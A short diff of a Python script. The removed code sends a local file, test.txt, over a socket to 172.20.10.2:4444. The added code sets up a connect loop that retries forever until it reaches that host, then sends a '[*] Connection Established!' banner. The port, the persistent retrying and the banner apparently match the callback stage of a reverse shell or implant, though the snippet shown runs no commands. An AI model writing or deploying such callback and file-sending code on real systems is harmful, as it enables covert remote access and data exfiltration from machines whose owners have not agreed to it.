@@ -2,15 +2,17 @@ import os
 import socket
 import sys
 
-def make_conn():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    ipaddr = "172.20.10.2"
-    port = 4444
-
-    file = open("test.txt","rb")
-    server_address = (ipaddr, port)
-    sock.connect(server_address)
-    sock.sendfile(file)
-    
+IP = "172.20.10.2"
+PORT = 4444
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
+def connect(ip: str, port: int):
+    server_address = (ip, port)
+    while True:
+        try:
+            sock.connect(server_address)
+            break
+        except:
+            continue
+    sock.send(str.encode("[*] Connection Established!"))
